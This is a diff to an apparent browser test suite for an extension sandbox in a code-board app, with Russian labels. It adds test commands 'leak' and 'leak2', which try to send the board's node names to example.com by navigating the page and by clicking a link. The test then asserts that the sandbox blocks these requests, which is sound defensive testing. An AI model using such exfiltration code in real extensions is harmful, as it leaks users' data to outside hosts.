@@ -59,6 +59,11 @@ triosteum.command('probe', async () => {
 triosteum.command('panel', async () => { document.body.innerHTML = '<h3 id="hi">Привет из панели</h3>'; await triosteum.ui.openPanel(); });
 triosteum.command('boom', () => { throw new Error('сломалось нарочно'); });
 triosteum.command('nav', () => { location.href = 'about:blank'; });
+triosteum.command('leak', async () => {
+  const b = await triosteum.board.get();
+  location.href = 'https://example.com/leak?data=' + encodeURIComponent(JSON.stringify(b.nodes.map((n) => n.name)));
+});
+triosteum.command('leak2', () => { const a = document.createElement('a'); a.href = 'https://example.com/leak2?x=1'; document.body.appendChild(a); a.click(); });
 triosteum.command('mk', async () => { await triosteum.board.add({ name: 'Для редактора', lang: 'python', code: 'print(1)' }); });
 triosteum.command('recode', async () => {
   const b = await triosteum.board.get();
@@ -98,7 +103,7 @@ const WRITER = { id: 'xpisatel', name: 'Писатель', perms: ['board.write'
 const EXT = {
   id: 'xproverka', name: 'Проверка схемы', desc: 'Тестовое расширение', perms: ['board.read', 'board.write', 'panel'], panel: 'Проверка',
   commands: [{ id: 'count', label: 'Посчитать и добавить' }, { id: 'probe', label: 'Проверить песочницу' }, { id: 'panel', label: 'Показать панель' },
-    { id: 'boom', label: 'Упасть' }, { id: 'nav', label: 'Уйти со страницы' }, { id: 'slow', label: 'Медленно' },
+    { id: 'boom', label: 'Упасть' }, { id: 'nav', label: 'Уйти со страницы' }, { id: 'leak', label: 'Вынести доску' }, { id: 'leak2', label: 'Вынести ссылкой' }, { id: 'slow', label: 'Медленно' },
     { id: 'mk', label: 'Блок для редактора' }, { id: 'recode', label: 'Переписать код' }, { id: 'switchy', label: 'Долгая правка' }, { id: 'hang', label: 'Зависнуть' }, { id: 'pause', label: 'С паузой' }, { id: 'many', label: 'Много блоков' }],
   code: CODE,
 };
@@ -181,9 +186,14 @@ await cmd(k, 'Панель «Проверка»'); await k.waitForTimeout(800);
 const pane = k.locator('.ext-pane.open');
 ok(await pane.count() === 1, 'панель расширения открылась');
 await cmd(k, 'Проверка схемы: Показать панель'); await k.waitForTimeout(500);
-ok(await k.frameLocator('.ext-pane.open iframe').locator('#hi').textContent() === 'Привет из панели', 'расширение рисует в своей панели');
+ok(await k.frameLocator('.ext-pane.open iframe').frameLocator('iframe').locator('#hi').textContent() === 'Привет из панели', 'расширение рисует в своей панели');
 ok(await k.locator('.ext-frame').first().getAttribute('sandbox') === 'allow-scripts', 'панель — iframe-песочница без allow-same-origin');
 if (SHOTS) await k.screenshot({ path: `${SHOTS}/ext-panel.png` });
+const leaks = [];
+k.on('request', (rq) => { if (/example\.com/.test(rq.url())) leaks.push(rq.url()); });
+await cmd(k, 'Проверка схемы: Вынести доску'); await k.waitForTimeout(1500);
+await cmd(k, 'Проверка схемы: Вынести ссылкой'); await k.waitForTimeout(1500);
+ok(leaks.length === 0, 'переход расширения на внешний адрес заблокирован до запроса' + (leaks.length ? ': ' + leaks[0] : ''));
 await cmd(k, 'Проверка схемы: Уйти');
 ok(/перейти на другую страницу/.test(await toastAfter(k, 4000)), 'уход со страницы замечен');
 await k.waitForTimeout(300);
